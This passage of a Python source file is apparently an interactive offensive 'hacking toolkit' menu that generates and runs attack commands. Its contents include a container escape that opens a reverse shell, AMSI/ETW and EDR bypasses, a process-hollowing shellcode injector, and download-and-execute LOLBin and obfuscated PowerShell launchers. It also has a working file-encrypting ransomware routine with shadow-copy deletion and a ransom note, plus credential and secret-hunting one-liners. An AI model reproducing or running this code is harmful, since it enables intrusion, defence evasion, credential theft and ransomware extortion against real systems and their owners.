          "fields":[("h","HCCAPX/PMKID file","handshake.hccapx"),("w","Wordlist",RY)],
          "cmd": lambda f: f"hashcat -m 22000 {f[0]} {f[1]}" },
        { "id":"5",  "name":"PMKID Attack",         "desc":"Clientless WPA PMKID capture",
          "fields":[("i","Monitor interface","wlan0mon"),("b","BSSID (opt)","")],
          "cmd": lambda f: f"hcxdumptool -i {f[0]} -o pmkid.pcapng --enable_status=1" + (f" --filterlist_ap={f[1]}" if f[1] else "") + f"\nhcxpcapngtool pmkid.pcapng -o hash.hc22000\nhashcat -m 22000 hash.hc22000 {RY}" },
        { "id":"6",  "name":"Evil Twin AP",         "desc":"Create rogue access point",
          "fields":[("s","Target SSID","CorpWiFi"),("i","Interface","wlan0"),("p","Passphrase (opt)","")],
          "cmd": lambda f: f"""cat > /tmp/hostapd.conf << 'EOF'
interface={f[1]}
driver=nl80211
ssid={f[0]}
channel=6
{'wpa=2' if f[2] else ''}
{'wpa_passphrase='+f[2] if f[2] else ''}
EOF
hostapd /tmp/hostapd.conf &
dnsmasq --interface={f[1]} --dhcp-range=192.168.10.2,192.168.10.50,12h &
echo 1 > /proc/sys/net/ipv4/ip_forward""" },
        { "id":"7",  "name":"Bluetooth Scan",       "desc":"Scan for nearby Bluetooth devices",
          "fields":[],
          "cmd": lambda f: "hciconfig hci0 up\nhcitool scan\nbtscanner &" },
        { "id":"8",  "name":"BLE Scan",             "desc":"Scan Bluetooth Low Energy devices",
          "fields":[],
          "cmd": lambda f: "hcitool lescan\n# Or with bettercap:\nbettercap -eval 'ble.recon on; events.stream on'" },
        { "id":"9",  "name":"SDR Signal Capture",   "desc":"Capture RF with rtl-sdr",
          "fields":[("f","Frequency Hz","433920000"),("r","Sample rate","2000000"),("o","Output","capture.iq")],
          "cmd": lambda f: f"rtl_sdr -f {f[0]} -s {f[1]} -n 10000000 {f[2]}" },
        { "id":"10", "name":"WPS Pin Attack",       "desc":"Brute force WPS PIN with reaver",
          "fields":[("i","Monitor interface","wlan0mon"),("b","BSSID","AA:BB:CC:DD:EE:FF")],
          "cmd": lambda f: f"reaver -i {f[0]} -b {f[1]} -vv --no-associate" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "container": { "label": "CONTAINER / K8S", "tools": [
        { "id":"1",  "name":"Docker Escape (sock)", "desc":"Escape via exposed Docker socket",
          "fields":[],
          "cmd": lambda f: """# Check socket:
ls -la /var/run/docker.sock
# Escape via container:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh""" },
        { "id":"2",  "name":"Docker Escape (cgroup)","desc":"Escape via cgroup release_agent",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f"""mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/bash" > /cmd
echo "bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" """ },
        { "id":"3",  "name":"K8s Pod Escape",       "desc":"Escape from privileged K8s pod",
          "fields":[],
          "cmd": lambda f: """# Check if privileged:
cat /proc/1/status | grep -i cap
# Mount host filesystem:
mkdir /tmp/hostmount
mount /dev/sda1 /tmp/hostmount 2>/dev/null || mount /dev/xvda1 /tmp/hostmount
ls /tmp/hostmount""" },
        { "id":"4",  "name":"K8s Secret Dump",      "desc":"Dump all K8s secrets",
          "fields":[("ns","Namespace","default")],
          "cmd": lambda f: f"kubectl get secrets -n {f[0]} -o json | python3 -c \"import sys,json,base64; d=json.load(sys.stdin); [print(s['metadata']['name'], {k:base64.b64decode(v).decode() for k,v in s.get('data',{{}}).items()}) for s in d['items']]\"" },
        { "id":"5",  "name":"K8s Service Account",  "desc":"Use mounted SA token to enum cluster",
          "fields":[],
          "cmd": lambda f: """TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S=https://kubernetes.default.svc
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $K8S/api/v1/namespaces
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $K8S/api/v1/pods""" },
        { "id":"6",  "name":"Trivy Container Scan",  "desc":"Scan container image for vulns",
          "fields":[("i","Image name","ubuntu:20.04")],
          "cmd": lambda f: f"trivy image {f[0]}" },
        { "id":"7",  "name":"K8s RBAC Audit",       "desc":"Enumerate RBAC permissions",
          "fields":[],
          "cmd": lambda f: "kubectl auth can-i --list\nkubectl get clusterrolebindings -o json | python3 -m json.tool" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "evasion": { "label": "AV / EDR EVASION", "tools": [
        { "id":"1",  "name":"AMSI Patch (PowerShell)","desc":"Disable AMSI in current PS session",
          "fields":[],
          "cmd": lambda f: """$a=[Ref].Assembly.GetTypes();
$b=ForEach($c in $a){if($c.Name -like '*iUtils'){$c}};
$d=$b.GetFields('NonPublic,Static');
$e=ForEach($f in $d){if($f.Name -like '*itFailed'){$f}};
$e.SetValue($Null,$true);
Write-Host "[+] AMSI disabled" """ },
        { "id":"2",  "name":"ETW Blind",            "desc":"Blind ETW logging in PowerShell",
          "fields":[],
          "cmd": lambda f: """[Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null
$e=[System.Diagnostics.Eventing.EventProvider]
$f=$e.GetField('m_enabled','NonPublic,Instance')
[void]$f.SetValue([Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider+'.replace('+','')+[char]0x46+'astEventProvider')::s_TupleProvider,$false)""" },
        { "id":"3",  "name":"Process Hollowing",    "desc":"Inject shellcode via process hollowing (C skeleton)",
          "fields":[("t","Target process","C:\\\\Windows\\\\System32\\\\notepad.exe")],
          "cmd": lambda f: f"""// Process hollowing skeleton — fill shellcode variable
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {{
    // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f c
}};

int main() {{
    STARTUPINFOA si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb = sizeof(si);
    CreateProcessA("{f[0]}", NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
                                MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, mem, shellcode, sizeof(shellcode), NULL);
    CONTEXT ctx = {{0}};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)mem;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    return 0;
}}""" },
        { "id":"4",  "name":"XOR Payload Encrypt",  "desc":"XOR-encrypt shellcode payload",
          "fields":[("k","XOR Key","0x41")],
          "cmd": lambda f: (
              "python3 << 'EOF'\n" +
              f"key = {f[0]}\n" +
              "# Paste raw shellcode bytes below:\n" +
              "shellcode = b\"\\x90\\x90\\x90\"  # replace\n" +
              "\n" +
              "encrypted = bytes([b ^ key for b in shellcode])\n" +
              "print(\"// Encrypted shellcode:\")\n" +
              "print(\"unsigned char enc[] = {};\" .format(\", \".join(\"0x{:02x}\".format(b) for b in encrypted)))\n" +
              "print()\n" +
              f"print(\"// XOR key: {f[0]}\")\n" +
              f"print(\"// Decrypt at runtime: for(int i=0;i<len;i++) enc[i]^={f[0]};\")\n" +
              "EOF"
          ) },
        { "id":"5",  "name":"Defender Exclusion",   "desc":"Add Windows Defender path exclusion",
          "fields":[("p","Path to exclude","C:\\\\Tools")],
          "cmd": lambda f: f"Add-MpPreference -ExclusionPath '{f[0]}'\n# Or via registry:\nreg add 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths' /v '{f[0]}' /t REG_DWORD /d 0 /f" },
        { "id":"6",  "name":"Living off the Land",  "desc":"LOLBins — execute payload via trusted binaries",
          "fields":[("u","Payload URL","http://10.10.14.1/shell.exe"),("m","Method (certutil/mshta/rundll32)","certutil")],
          "cmd": lambda f: {
              "certutil":  f"certutil -urlcache -split -f {f[0]} C:\\Temp\\shell.exe && C:\\Temp\\shell.exe",
              "mshta":     f"mshta {f[0]}",
              "rundll32":  f"rundll32 url.dll,OpenURL {f[0]}",
          }.get(f[1], f"certutil -urlcache -split -f {f[0]} payload.exe") },
        { "id":"7",  "name":"Syscall Bypass",       "desc":"Direct syscall to bypass EDR hooks (C snippet)",
          "fields":[],
          "cmd": lambda f: """// Direct NtAllocateVirtualMemory via inline asm — bypasses EDR hooks on ntdll
#include <windows.h>
typedef NTSTATUS (NTAPI* NtAllocate)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

NTSTATUS DirectAlloc(PVOID* baseAddr, SIZE_T size) {
    // SSN for NtAllocateVirtualMemory — varies per Windows version
    // Use SysWhispers3 to generate correct stubs automatically
    __asm__ volatile (
        "mov r10, rcx\\n"
        "mov eax, 0x18\\n"   // SSN — update per target
        "syscall\\n"
        : : : "r10", "eax"
    );
}
// Use SysWhispers3 for full implementation:
// https://github.com/klezVirus/SysWhispers3""" },
        { "id":"8",  "name":"Obfuscated PS Launcher","desc":"Base64 + GZIP compressed PS payload",
          "fields":[("c","PS Command","IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/payload.ps1')")],
          "cmd": lambda f: f"""python3 << 'EOF'
import base64, gzip, io
cmd = '{f[0]}'
buf = io.BytesIO()
with gzip.GzipFile(fileobj=buf, mode='wb') as gz:
    gz.write(cmd.encode('utf-16-le'))
compressed = base64.b64encode(buf.getvalue()).decode()
print(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {base64.b64encode(cmd.encode('utf-16-le')).decode()}")
EOF""" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "osint": { "label": "OSINT DEEP", "tools": [
        { "id":"1",  "name":"Maltego OSINT Prep",   "desc":"Prep CSV for Maltego import",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"theHarvester -d {f[0]} -l 1000 -b all -f maltego_prep.xml" },
        { "id":"2",  "name":"Sherlock Username",    "desc":"Hunt username across 300+ sites",
          "fields":[("u","Username","target_handle")],
          "cmd": lambda f: f"python3 /opt/sherlock/sherlock.py {f[0]} --output sherlock.txt" },
        { "id":"3",  "name":"Recon-ng Full",        "desc":"Run full Recon-ng workspace",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"""recon-ng -w target << 'EOF'
marketplace install all
modules load recon/domains-hosts/hackertarget
options set SOURCE {f[0]}
run
EOF""" },
        { "id":"4",  "name":"LinkedIn OSINT",       "desc":"Extract LinkedIn employees via Google",
          "fields":[("c","Company name","Acme Corp")],
          "cmd": lambda f: f'echo "Google dork: site:linkedin.com/in/ \\"{f[0]}\\""\ncurl -s "https://api.linkedin.com/v2/people" -H "Authorization: Bearer YOUR_TOKEN"' },
        { "id":"5",  "name":"Breach Check",         "desc":"Check email in known breaches via HIBP",
          "fields":[("e","Email","user@target.com")],
          "cmd": lambda f: f'curl -s -H "hibp-api-key: YOUR_KEY" "https://haveibeenpwned.com/api/v3/breachedaccount/{f[0]}" | python3 -m json.tool' },
        { "id":"6",  "name":"Paste Sites Hunt",     "desc":"Search paste sites for target info",
          "fields":[("q","Search term","target.com password")],
          "cmd": lambda f: (f'curl -s "https://psbdmp.ws/api/v3/search/{f[0]}" | python3 -m json.tool' + "\n# Also check:\n" + f'echo "https://pastebin.com/search?q={f[0].replace(chr(32), chr(43))}"') },
        { "id":"7",  "name":"Reverse Image Search", "desc":"Generate TinEye + Google reverse search URLs",
          "fields":[("u","Image URL","https://target.com/photo.jpg")],
          "cmd": lambda f: f'echo "TinEye: https://tineye.com/search/?url={f[0]}"\necho "Google: https://www.google.com/searchbyimage?image_url={f[0]}"\necho "Yandex: https://yandex.com/images/search?url={f[0]}&rpt=imageview"' },
        { "id":"8",  "name":"Company Email Format", "desc":"Find company email format + generate list",
          "fields":[("d","Domain","target.com"),("fn","First name","john"),("ln","Last name","doe")],
          "cmd": lambda f: f"""python3 << 'EOF'
domain = '{f[0]}'
first = '{f[1]}'
last = '{f[2]}'
formats = [
    f'{{first}}@{{domain}}',
    f'{{first}}.{{last}}@{{domain}}',
    f'{{first[0]}}{{last}}@{{domain}}',
    f'{{first[0]}}.{{last}}@{{domain}}',
    f'{{last}}.{{first}}@{{domain}}',
    f'{{first}}{{last[0]}}@{{domain}}',
]
for e in formats:
    print(e)
EOF""" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "ransomware": { "label": "RANSOMWARE ANALYSIS", "tools": [
        { "id":"1",  "name":"File Encryption Demo",  "desc":"AES-256 file encrypt (analysis/demo)",
          "fields":[("d","Directory to encrypt","/tmp/test_encrypt"),("k","Key (32 chars)","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1")],
          "cmd": lambda f: f"""python3 << 'EOF'
import os, glob
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets

key = b'{f[1]}'[:32].ljust(32, b'0')
iv = secrets.token_bytes(16)

for fpath in glob.glob('{f[0]}/**/*', recursive=True):
    if os.path.isfile(fpath) and not fpath.endswith('.enc'):
        with open(fpath, 'rb') as f_in:
            data = f_in.read()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        enc = cipher.encryptor()
        padded = data + b'\\x00'*(16-len(data)%16)
        encrypted = iv + enc.update(padded) + enc.finalize()
        with open(fpath+'.enc', 'wb') as f_out:
            f_out.write(encrypted)
        os.remove(fpath)
        print(f'Encrypted: {{fpath}}')
EOF""" },
        { "id":"2",  "name":"Decryption Recover",   "desc":"Reverse AES-256 encryption above",
          "fields":[("d","Directory","/tmp/test_encrypt"),("k","Key","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1")],
          "cmd": lambda f: f"""python3 << 'EOF'
import os, glob
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

key = b'{f[1]}'[:32].ljust(32, b'0')

for fpath in glob.glob('{f[0]}/**/*.enc', recursive=True):
    with open(fpath, 'rb') as f_in:
        data = f_in.read()
    iv, ciphertext = data[:16], data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor()
    decrypted = (dec.update(ciphertext) + dec.finalize()).rstrip(b'\\x00')
    out = fpath[:-4]
    with open(out, 'wb') as f_out:
        f_out.write(decrypted)
    os.remove(fpath)
    print(f'Decrypted: {{out}}')
EOF""" },
        { "id":"3",  "name":"Ransomware IOC Hunt",  "desc":"Hunt for ransomware IoCs on system",
          "fields":[],
          "cmd": lambda f: """echo '=== Shadow Copies ===' && vssadmin list shadows 2>/dev/null
echo '=== Recent .enc/.locked files ===' && find / -name '*.enc' -o -name '*.locked' -o -name '*.crypto' 2>/dev/null | head -20
echo '=== Ransom notes ===' && find / -iname '*ransom*' -o -iname '*decrypt*' -o -iname 'READ_ME*' 2>/dev/null | head -10
echo '=== Suspicious processes ===' && ps aux | grep -iE 'vssadmin|wbadmin|bcdedit' | grep -v grep""" },
        { "id":"4",  "name":"Shadow Copy Delete",   "desc":"Delete VSS shadow copies (red team)",
          "fields":[],
          "cmd": lambda f: "vssadmin delete shadows /all /quiet\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\nwbadmin delete catalog -quiet" },
        { "id":"5",  "name":"Ransom Note Template", "desc":"Generate ransom note structure",
          "fields":[("e","Contact email","contact@protonmail.com"),("t","Unique ID","VICTIM-ID-HERE")],
          "cmd": lambda f: f"""cat << 'EOF'
YOUR FILES HAVE BEEN ENCRYPTED

All your important files have been encrypted with AES-256.

To recover your files:
1. Send your unique ID to: {f[0]}
2. Your unique ID: {f[1]}
3. You will receive decryption instructions within 24 hours.

DO NOT:
- Attempt to decrypt files yourself
- Delete encrypted files
- Contact law enforcement

DO NOT RENAME encrypted files — this will make them unrecoverable.
EOF""" },
    ]},
}

# ─── CHEAT SHEET ─────────────────────────────────────────────────────────────
CHEATSHEET = [
    ("TTY Upgrade",         "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm  # Ctrl+Z → stty raw -echo → fg"),
    ("SSH Port Forward",    "ssh -L 8080:127.0.0.1:80 user@target\nssh -R 4444:127.0.0.1:4444 user@jump"),
    ("File Transfer",       "python3 -m http.server 8000\ncurl http://atk:8000/file -o /tmp/file"),
    ("Netcat Listener",     "rlwrap nc -nlvp 4444"),
    ("SUID Find",           "find / -perm -4000 -type f 2>/dev/null"),
    ("World Writable",      "find / -perm -0002 -type f 2>/dev/null"),
    ("Passwd Hash Gen",     "openssl passwd -6 -salt xyz newpassword"),
    ("Decode Base64",       "echo 'string' | base64 -d"),
    ("Hex Dump",            "xxd file.bin | head -30"),
    ("Port Scan Bash",      "for p in {1..1000}; do (echo >/dev/tcp/target/$p) 2>/dev/null && echo open:$p; done"),
    ("Find Configs",        "find / -name '*.conf' -o -name '.env' 2>/dev/null"),
    ("Process by Port",     "ss -tlnp | grep ':80'"),
    ("Capabilities",        "getcap -r / 2>/dev/null"),
    ("Writable PATH",       "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type f 2>/dev/null"),
    ("Linux Users",         "cat /etc/passwd | grep -v nologin | grep -v false"),
    ("Network Connections", "ss -antp; netstat -tulpn 2>/dev/null"),
    ("Env Secrets",         "env | grep -iE 'pass|key|secret|token|api'"),
    ("Find SSH Keys",       "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null"),
    ("Docker Check",        "cat /proc/1/cgroup | grep docker; ls -la /var/run/docker.sock 2>/dev/null"),
    ("AWS Creds Hunt",      "find / -name 'credentials' -path '*aws*' 2>/dev/null; env | grep AWS"),
    ("K8s Token",           "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null"),
    ("Git Secrets",         "git log --all --full-history -- '*.env' '*.key' '*.pem' 2>/dev/null"),
    ("History Hunt",        "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|token|api'"),
    ("Proc Memory Scan",    "grep -r '' /proc/*/environ 2>/dev/null | grep -iE 'pass|token|secret'"),
    ("Shadow Read",         "cat /etc/shadow 2>/dev/null"),
]

BANNER = """
██╗     ██╗   ██╗ ██████╗██╗██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
██║     ██║   ██║██╔════╝██║██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
██║     ██║   ██║██║     ██║██║███████╗       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
██║     ██║   ██║██║     ██║██║╚════██║       ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
███████╗╚██████╔╝╚██████╗██║██║███████║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝"""

CATEGORY_KEYS = list(TOOLS.keys())

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def total_tools():
    return sum(len(s["tools"]) for s in TOOLS.values())

def search_tools(query):
    results = []
    q = query.lower()
    for cat_key, cat in TOOLS.items():
        for t in cat["tools"]:
            if q in t["name"].lower() or q in t["desc"].lower():
                results.append((cat_key, t))
    return results

# ─── UI ───────────────────────────────────────────────────────────────────────
def show_banner():
    clear()
    console.print(Text(BANNER, style="bold #ff4d6d"))
    console.print(Align.center(Text("made by lucii  |  v2 MAX", style="#666666 italic")))
    console.print()

def show_main_menu():
    show_banner()
    fav_count = len(FAVORITES)
    console.print(Align.center(
        Panel(
            f"[bold #ff4d6d]{total_tools()} tools[/]  [#444]·[/]  "
            f"[bold #ffd60a]{len(TOOLS)} categories[/]  [#444]·[/]  "
            f"[#00ff9d]The Ultimate Hacking Toolkit v2[/]  [#444]·[/]  "
            f"[#f77f00]★ {fav_count} favs[/]",
            border_style="#222222", padding=(0, 4)
        )
    ))
    console.print()

    menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2), border_style="#222222", expand=False)
    menu.add_column("n", style="#555555", width=4)
    menu.add_column("cat", width=26)
    menu.add_column("cnt", justify="right", width=5)

    for i, (key, s) in enumerate(TOOLS.items(), 1):
        col = C[key]
        menu.add_row(str(i), f"[bold {col}]{s['label']}[/]", f"[{col}]{len(s['tools'])}[/]")

    console.print(Align.center(menu))
    console.print()
    console.print(
        f"  [#444]select[/] [#ff4d6d]1-{len(TOOLS)}[/]"
        f"  [#444]│[/]  [#ffd60a]c[/] [#444]cheatsheet[/]"
        f"  [#444]│[/]  [#00ff9d]s[/] [#444]search[/]"
        f"  [#444]│[/]  [#f77f00]*[/] [#444]favorites[/]"
        f"  [#444]│[/]  [#7b5ea7]e[/] [#444]export all[/]"
        f"  [#444]│[/]  [#666]q[/] [#444]quit[/]"
    )
    console.print()

def show_category(key, show_favs_only=False):
    s = TOOLS[key]
    col = C[key]
    clear()
    console.print()
    tools_to_show = [t for t in s["tools"] if not show_favs_only or fav_key(key, t["id"]) in FAVORITES]
    console.print(Rule(f"[bold {col}] {s['label']} [/]  [#444]{len(tools_to_show)} tools[/]", style="#333333"))
    console.print()

    table = Table(box=box.SIMPLE, show_header=True,
                  header_style=f"bold {col}",
                  border_style="#222222", expand=True, padding=(0,1))
    table.add_column("#", width=4, style="#555555")
    table.add_column("Tool", width=26)
    table.add_column("Description", style="#777777")
    table.add_column("★", width=3)

    for t in tools_to_show:
        fav = "★" if fav_key(key, t["id"]) in FAVORITES else " "
        table.add_row(t["id"], f"[bold {col}]{t['name']}[/]", t["desc"], f"[#f77f00]{fav}[/]")

    console.print(table)
    console.print(f"\n  [#555]select #[/]  [#444]│[/]  [#ffd60a]b[/] [#555]back[/]  [#444]│[/]  [#f77f00]f#[/] [#555]favorite toggle[/]\n")

def collect_fields(tool, col):
    values = []
    if tool["fields"]:
        console.print(f"\n  [bold {col}]parameters[/]  [#444](enter = default)[/]\n")
        for _, label, default in tool["fields"]:
            val = Prompt.ask(f"  [#aaa]{label}[/]", default=default,
                             show_default=True, console=console)
            values.append(val.strip())
    return values

def show_tool(tool, col, cat_key):
    clear()
    console.print()
    fav = "★ " if fav_key(cat_key, tool["id"]) in FAVORITES else ""
    console.print(Rule(f"[bold {col}] {fav}{tool['name']} [/]", style=col))
    console.print(f"  [#555]{tool['desc']}[/]\n")

    values = collect_fields(tool, col)

    try:
        cmd = tool["cmd"](values)
    except Exception as e:
        cmd = f"# error generating command: {e}"

    console.print(f"\n  [bold {col}]command[/]\n")
    console.print(Panel(
        Syntax(cmd, "bash", theme="one-dark", line_numbers=False, word_wrap=True),
        border_style="#333333", padding=(0,1)
    ))
    console.print(
        f"\n  [#ffd60a]r[/] [#555]run[/]"
        f"  [#444]│[/]  [#00ff9d]g[/] [#555]regenerate[/]"
        f"  [#444]│[/]  [#f77f00]f[/] [#555]fav toggle[/]"
        f"  [#444]│[/]  [#3a86ff]cp[/] [#555]copy[/]"
        f"  [#444]│[/]  [#666]b[/] [#555]back[/]\n"
    )
    return cmd

def show_cheatsheet():
    clear()
    console.print()
    console.print(Rule(f"[bold #ffd60a] CHEAT SHEET [/]  [#444]{len(CHEATSHEET)} one-liners[/]", style="#333333"))
    console.print()
    for title, cmd in CHEATSHEET:
        console.print(f"  [bold #ffd60a]{title}[/]")
        console.print(Panel(
            Syntax(cmd, "bash", theme="one-dark", word_wrap=True),
            border_style="#222222", padding=(0,1)
        ))
        console.print()
    console.print("  [#555]enter to go back[/]")
    input()

def show_search(query):
    results = search_tools(query)
    clear()
    console.print()
    console.print(Rule(f"[bold #00ff9d] SEARCH: {query} [/]  [#444]{len(results)} results[/]", style="#333333"))
    console.print()

    if not results:
        console.print("  [#f00]no results[/]\n")
        input("  enter to continue ")
        return None

    table = Table(box=box.SIMPLE, show_header=True,
                  header_style="bold #00ff9d",
                  border_style="#222222", expand=True, padding=(0,1))
    table.add_column("Cat", width=6, style="#555555")
    table.add_column("#", width=4, style="#555555")
    table.add_column("Tool", width=26)
    table.add_column("Description", style="#777777")

    for i, (cat_key, t) in enumerate(results, 1):
        col = C[cat_key]
        table.add_row(f"[{col}]{cat_key[:4]}[/]", str(i), f"[bold {col}]{t['name']}[/]", t["desc"])

    console.print(table)
    console.print(f"\n  [#555]select # to view tool[/]  [#444]│[/]  [#666]enter[/] [#555]back[/]\n")

    choice = Prompt.ask("  [#aaa]→[/]", console=console).strip()
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(results):
            return results[idx]
    return None

def show_all_favorites():
    clear()
    console.print()
    console.print(Rule("[bold #f77f00] FAVORITES [/]", style="#333333"))
    console.print()

    if not FAVORITES:
        console.print("  [#555]no favorites yet — press f# inside a tool to add[/]\n")
        input("  enter to go back ")
        return None

    results = []
    for fk in FAVORITES:
        cat_key, tool_id = fk.split(":", 1)
        if cat_key in TOOLS:
            tool = next((t for t in TOOLS[cat_key]["tools"] if t["id"] == tool_id), None)
            if tool:
                results.append((cat_key, tool))

    table = Table(box=box.SIMPLE, show_header=True,
                  header_style="bold #f77f00",
                  border_style="#222222", expand=True, padding=(0,1))
    table.add_column("#", width=4)
    table.add_column("Cat", width=8)
    table.add_column("Tool", width=26)
    table.add_column("Description", style="#777777")

    for i, (cat_key, t) in enumerate(results, 1):
        col = C[cat_key]
        table.add_row(str(i), f"[{col}]{cat_key[:6]}[/]", f"[bold {col}]{t['name']}[/]", t["desc"])

    console.print(table)
    console.print(f"\n  [#555]select # to run[/]  [#444]│[/]  [#666]enter[/] [#555]back[/]\n")

    choice = Prompt.ask("  [#aaa]→[/]", console=console).strip()
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(results):
            return results[idx]
    return None

# ─── MAIN LOOP ────────────────────────────────────────────────────────────────
def run_tool_screen(cat_key, tool):
    global FAVORITES
    col = C[cat_key]
    while True:
        cmd = show_tool(tool, col, cat_key)
        log_session(cat_key, tool["name"], cmd)
        action = Prompt.ask("  [#aaa]→[/]", console=console).strip().lower()
        if action == "b":
            break
        elif action == "r":
            console.print(f"\n  [bold {col}]running...[/]\n")
            try:
                result = subprocess.run(cmd, shell=True, executable="/bin/bash")
                if result.returncode == 0:
                    console.print("\n  [bold #00ff9d]✓ completed[/]")
                else:
                    console.print(f"\n  [bold #ff4d6d]✗ exit code: {result.returncode}[/]")
            except KeyboardInterrupt:
                console.print("\n  [#f77f00]interrupted[/]")
            console.print("\n  [#555]enter to continue[/]")
            input()
            break
        elif action == "g":
            continue
        elif action == "f":
            fk = fav_key(cat_key, tool["id"])
            if fk in FAVORITES:
                FAVORITES.discard(fk)
                console.print("  [#555]removed from favorites[/]")
            else:
                FAVORITES.add(fk)
                console.print("  [#f77f00]★ added to favorites[/]")
            save_favorites(FAVORITES)
        elif action == "cp":
            if copy_to_clipboard(cmd):
                console.print("  [#00ff9d]copied to clipboard[/]")
            else:
                console.print("  [#f00]clipboard not available (install xclip or pyperclip)[/]")
        else:
            console.print("  [#f00]unknown action[/]")

def run_tool_loop(key):
    global FAVORITES
    s = TOOLS[key]
    while True:
        show_category(key)
        choice = Prompt.ask("  [#aaa]→[/]", console=console).strip().lower()
        if choice == "b":
            break
        # favorite toggle from list
        if choice.startswith("f") and choice[1:].isdigit():
            tool = next((t for t in s["tools"] if t["id"] == choice[1:]), None)
            if tool:
                fk = fav_key(key, tool["id"])
                if fk in FAVORITES:
                    FAVORITES.discard(fk)
                    console.print("  [#555]removed from favorites[/]")
                else:
                    FAVORITES.add(fk)
                    console.print("  [#f77f00]★ added[/]")
                save_favorites(FAVORITES)
            continue
        tool = next((t for t in s["tools"] if t["id"] == choice), None)
        if not tool:
            console.print("  [#f00]not found[/]")
            continue
        run_tool_screen(key, tool)

def main():
    global FAVORITES
    try:
        readline.parse_and_bind("tab: complete")
        if HISTORY_FILE.exists():
            readline.read_history_file(str(HISTORY_FILE))
        readline.set_history_length(1000)
    except Exception:
        pass

    while True:
        show_main_menu()
        choice = Prompt.ask("  [#aaa]→[/]", console=console).strip().lower()

        if choice == "q":
            try:
                readline.write_history_file(str(HISTORY_FILE))
            except Exception:
                pass
            clear()
            console.print(f"\n  [#ff4d6d]lucii's toolkit v2 offline.[/]\n")
            sys.exit(0)

        elif choice == "c":
            show_cheatsheet()

        elif choice == "s":
            query = Prompt.ask("  [#00ff9d]search[/]", console=console).strip()
            if query:
                result = show_search(query)
                if result:
                    cat_key, tool = result
                    run_tool_screen(cat_key, tool)

        elif choice == "*":
            result = show_all_favorites()
            if result:
                cat_key, tool = result
                run_tool_screen(cat_key, tool)

        elif choice == "e":
            export_all_commands(TOOLS)

        elif choice.isdigit() and 1 <= int(choice) <= len(CATEGORY_KEYS):
            run_tool_loop(CATEGORY_KEYS[int(choice) - 1])

        else:
            console.print("  [#f00]unknown[/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        try:
            readline.write_history_file(str(HISTORY_FILE))
        except Exception:
            pass
        clear()
        console.print(f"\n  [#ff4d6d]lucii's toolkit v2 offline.[/]\n")
        sys.exit(0)